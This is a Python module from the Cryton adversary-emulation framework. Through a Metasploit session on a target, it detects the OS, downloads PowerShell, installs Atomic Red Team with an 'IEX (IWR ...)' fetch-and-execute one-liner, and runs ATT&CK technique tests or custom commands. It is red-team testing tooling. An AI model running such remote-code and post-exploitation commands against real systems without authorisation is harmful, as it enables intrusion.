import re
from typing import Optional, Union
import requests
from snek_sploit import Error as MSFError, RPCError as MSFRPCError, SessionShell, SessionMeterpreter, SessionRing

from cryton.lib.utility.module import ModuleBase, ModuleOutput, Result
from cryton.lib.metasploit import MetasploitClientUpdated
from cryton.lib.utility.enums import StrEnum


class OS(StrEnum):
    LINUX = "linux"
    WINDOWS = "win"
    OSX = "osx"


class Architecture(StrEnum):
    X64 = "x64"
    X86 = "x86"
    ARM64 = "arm64"
    ARM32 = "arm32"


class Module(ModuleBase):
    SCHEMA = {
        "definitions": {
            "powershell": {
                "type": "object",
                "description": "Powershell related options.",
                "properties": {
                    "executable": {"type": "string", "description": "Path to Powershell executable."},
                    "install": {"type": "boolean", "description": "Whether to auto install Powershell."},
                },
                "additionalProperties": False,
                "maxProperties": 1,
            },
            "session_id": {"type": "integer", "description": "Metasploit session ID to use."},
        },
        "type": "object",
        "description": "Arguments for the `atomic_red_team` module.",
        "oneOf": [
            {
                "properties": {
                    "session_id": {"$ref": "#/definitions/session_id"},
                    "powershell": {"$ref": "#/definitions/powershell"},
                    "technique": {
                        "type": "string",
                        "description": "ID of the Atomic technique (possibly with test IDs).",
                    },
                    "test_guids": {"type": "array", "items": {"type": "string"}, "description": "Test GUIDs to run."},
                    "parameters": {"type": "object", "description": "Input arguments for the test(s)."},
                },
                "additionalProperties": False,
                "required": ["technique"],
            },
            {
                "properties": {
                    "session_id": {"$ref": "#/definitions/session_id"},
                    "powershell": {"$ref": "#/definitions/powershell"},
                    "command": {"type": "string", "description": "Custom Atomic command."},
                },
                "additionalProperties": False,
            },
        ],
    }

    def __init__(self, arguments: dict):
        super().__init__(arguments)
        self._msf_client = MetasploitClientUpdated(log_in=False)

        # session
        self._session_id: int = self._arguments.get("session_id")
        self._session: Union[SessionShell, SessionMeterpreter, SessionRing, None] = None

        # atomic
        self._atomic_technique: str = self._arguments.get("technique", "")
        self._atomic_parameters: dict[str, str] = self._arguments.get("parameters", {})
        self._atomic_test_guids: list[str] = self._arguments.get("test_guids", [])
        self._command: str = self._arguments.get("command", "")

        # powershell
        self._powershell_arguments: dict = self._arguments.get("powershell", {})
        self._powershell_executable: str = self._powershell_arguments.get("executable", "")
        # possible files: https://github.com/PowerShell/PowerShell/releases/latest (must be tar or zip)
        self._powershell_install: bool = self._powershell_arguments.get("install", False)

        # target
        self._target_os: Optional[OS] = None
        self._target_arch: Optional[Architecture] = None

        # Other
        self._debug_output: str = ""

    def check_requirements(self) -> None:
        try:
            self._msf_client.health.rpc.check()
        except MSFRPCError as ex:
            raise ConnectionError(
                f"Unable to establish connection with MSF RPC. "
                f"Check if the service is running and connection parameters. Original error: {ex}"
            )
        try:
            self._msf_client.login()
        except MSFError as ex:
            raise RuntimeError(f"Unable to authenticate with the MSF RPC server. Original error: {ex}")

    def execute(self) -> ModuleOutput:
        self._get_session()

        if not self._get_target_info():
            self._data.output += self._debug_output
            return self._data

        if self._powershell_install and not self._install_powershell():
            self._data.output += self._debug_output
            return self._data

        if not self._check_for_powershell():
            self._data.output += self._debug_output
            return self._data

        if not self._check_if_atomic_is_installed():
            self._install_atomic()
        output = self._run_atomic_technique()

        self._parse_results(output)
        self._data.result = Result.OK
        return self._data

    def _get_session(self):
        self._session = self._msf_client.sessions.get(self._session_id)

    def _execute_in_session(self, executable: str, arguments: list[str]):
        output = self._session.execute_in_shell(executable, arguments)
        self._debug_output += output

        if self._target_os == OS.WINDOWS:
            return output.split("\n", 1)[1]

        return output

    def _get_target_info(self) -> bool:
        if self._get_target_info_linux():
            return True
        if self._get_target_info_windows():
            return True
        if self._get_target_info_osx():
            return True

        self._debug_output += "\nUnable to detect target OS and architecture."
        return False

    def _get_target_info_linux(self) -> bool:
        """
        Check if the target system is Linux. If so, return its architecture.
        :return: Processor architecture
        """
        x64_architectures = ["x86_64"]
        x86_architectures = ["x86_32", "i686", "i386"]  # Unsupported by powershell
        arm64_architectures = ["aarch64"]
        arm32_architectures = ["armv7l"]

        output = self._execute_in_session("uname", ["-m"])
        self._target_arch = self._match_architecture(
            output, x64_architectures, x86_architectures, arm64_architectures, arm32_architectures
        )

        if self._target_arch:
            self._target_os = OS.LINUX
            if self._target_arch == Architecture.X86:
                return False
            return True

        return False

    def _get_target_info_windows(self) -> bool:
        x64_architectures = ["AMD64", "IA64", "EM64T"]
        x86_architectures = ["X86"]
        arm64_architectures = ["ARM64"]
        arm32_architectures = ["ARM32"]  # Unsupported by powershell

        # Shell
        output = self._execute_in_session("echo", ["%Processor_ARCHITECTURE%"])
        self._target_arch = self._match_architecture(
            output, x64_architectures, x86_architectures, arm64_architectures, arm32_architectures
        )

        if self._target_arch:
            self._target_os = OS.WINDOWS
            if self._target_arch == Architecture.ARM32:
                return False

            # Check for Powershell
            output = self._execute_in_session("powershell.exe", ["-Command", "$PSVersionTable"])
            if self._parse_powershell_major_version(output) == -1:
                return False

            # Enter existing Powershell
            self._execute_in_session("powershell.exe", [])

            return True

        # Powershell
        output = self._execute_in_session("echo", ["$env:Processor_ARCHITECTURE"])
        self._target_arch = self._match_architecture(
            output, x64_architectures, x86_architectures, arm64_architectures, arm32_architectures
        )

        if self._target_arch:
            self._target_os = OS.WINDOWS
            if self._target_arch == Architecture.ARM32:
                return False
            return True

        return False

    def _get_target_info_osx(self) -> bool:
        return False

    @staticmethod
    def _match_architecture(
        arch_string: str,
        x64_architectures: list[str],
        x86_architectures: list[str],
        arm64_architectures: list[str],
        arm32_architectures: list[str],
    ) -> Optional[Architecture]:
        if any(arch in arch_string for arch in x64_architectures):
            return Architecture.X64
        elif any(arch in arch_string for arch in x86_architectures):
            return Architecture.X86
        elif any(arch in arch_string for arch in arm64_architectures):
            return Architecture.ARM64
        elif any(arch in arch_string for arch in arm32_architectures):
            return Architecture.ARM32

        return None

    def _install_powershell(self) -> bool:
        if self._target_os == OS.LINUX:
            return self._install_powershell_on_linux()
        elif self._target_os == OS.WINDOWS:
            return self._install_powershell_on_windows()
        else:
            return self._install_powershell_on_osx()

    def _install_powershell_on_linux(self) -> bool:
        file_name, file_url = self._get_powershell_download_info()
        self._execute_in_session("wget", [file_url])
        self._execute_in_session("mkdir", ["--verbose", "~/powershell"])
        self._execute_in_session("tar", ["zxf", file_name, "-C", "~/powershell", "--verbose"])
        self._execute_in_session("chmod", ["--verbose", "+x", "~/powershell/pwsh"])

        self._powershell_executable = "~/powershell/pwsh"

        return True

    def _install_powershell_on_windows(self) -> bool:
        # Windows 11, 10, and 7 have Powershell installed by default, but can be a lower version.
        # The following works only in Powershell since multiple tests showed inconsistent results using tools in the CMD
        file_name, file_url = self._get_powershell_download_info()
        self._execute_in_session("Invoke-WebRequest", ["-Uri", file_url, "-OutFile", file_name])
        self._execute_in_session("mkdir", ["powershell"])
        self._execute_in_session("tar", ["-xf", file_name, "-C", "powershell", "-v"])

        self._powershell_executable = "~/powershell/pwsh"

        return True

    def _install_powershell_on_osx(self) -> bool:
        return False

    def _check_for_powershell(self) -> bool:
        if self._powershell_executable:
            executables = [self._powershell_executable]
        else:
            executables = [
                "pwsh",  # Installed with snapd
                "~/powershell/pwsh",  # Installed from GitHub - Linux/Windows
                "powershell.exe",  # Default on Windows
            ]

        for executable in executables:
            output = self._execute_in_session(executable, ["-NonInteractive", "-Command", "'$PSVersionTable'"])

            powershell_version = self._parse_powershell_major_version(output)
            if powershell_version == -1:
                self._debug_output += "\nPowershell not found."
            elif self._parse_powershell_major_version(output) >= 5:
                self._debug_output += "\nPowershell found."
                self._powershell_executable = executable
                return True
            else:
                self._debug_output += "\nPowershell found, but is a lower version."

        return False

    @staticmethod
    def _parse_powershell_major_version(output) -> int:
        try:
            version = re.search(r"PSVersion +([\d.]+)", output).groups()[0]
            return int(version.split(".", 1)[0])  # major version
        except AttributeError:
            return -1

    def _get_powershell_download_info(self) -> tuple[str, str]:
        download_info = requests.get("https://api.github.com/repos/PowerShell/PowerShell/releases/latest").json()
        for asset in download_info["assets"]:
            asset_name = asset["name"]
            if re.fullmatch(
                rf"[pP]ower[sS]hell-.+-{self._target_os.value}-{self._target_arch.value}\.(zip|tar\.gz)", asset_name
            ):
                return asset_name, asset["browser_download_url"]

        raise RuntimeError(f"Unable to find powershell for {self._target_os.value} {self._target_arch.value}.")

    def _check_if_atomic_is_installed(self):
        path = "C:/AtomicRedTeam" if self._target_os == OS.WINDOWS else "~/AtomicRedTeam"
        output = self._execute_in_session(
            self._powershell_executable,
            [
                "-NonInteractive",
                "-Command",
                f"'Get-ChildItem -Path {path} -Recurse -Filter Invoke-AtomicRedTeam.psd1 -Name'",
            ],
        )

        if "Invoke-AtomicRedTeam.psd1" not in output:
            return False

        return True

    def _install_atomic(self):
        self._execute_in_session(
            self._powershell_executable,
            [
                "-NonInteractive",
                "-Command",
                "'IEX (IWR https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install"
                "-atomicredteam.ps1 -UseBasicParsing); Install-AtomicRedTeam -getAtomics'",
            ],
        )

    def _run_atomic_technique(self) -> str:
        path = "C:/AtomicRedTeam" if self._target_os == OS.WINDOWS else "~/AtomicRedTeam"
        command = f"'Import-Module {path}/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 -Force; "
        if self._command:
            command += f"{self._command}'"
        else:
            formatted_parameters = [f'"{param}" = "{value}"' for param, value in self._atomic_parameters.items()]
            input_arguments = f"@{{ {';'.join(formatted_parameters)} }}"
            test_guids = f"-TestGuids {','.join(self._atomic_test_guids)}" if self._atomic_test_guids else ""
            command += f"Invoke-AtomicTest {self._atomic_technique} -InputArgs {input_arguments} {test_guids}'"

        # Enter the target Powershell, since older versions of Powershell may fail to parse the `input_arguments`
        if self._target_os == OS.WINDOWS:
            self._execute_in_session(self._powershell_executable, [])

        return self._execute_in_session(self._powershell_executable, ["-NonInteractive", "-Command", command])

    def _parse_results(self, output):
        """
        Decide
        :param output:
        :return:
        """
        # TODO: Each technique states its start and end, between is the result. Filter it with regex?
        if "Start-ExecutionLog not found or loaded from the wrong module" in output:
            self._data.output += self._debug_output
        else:
            # TODO: Add validation for the correct execution (match/count executed tests against input + exit codes)
            # Valid output:
            # PathToAtomicsFolder = C:\\AtomicRedTeam\\atomics\n\r\nExecuting test: T1222.001-1 Take ownership using
            # takeown utility\r\nERROR: The system cannot find the file specified.\r\nExit code: 1\r\nDone executing
            # test: T1222.001-1 Take ownership using takeown utility\r\nPS C:\\Users\\vagrant>
            self._data.output += output
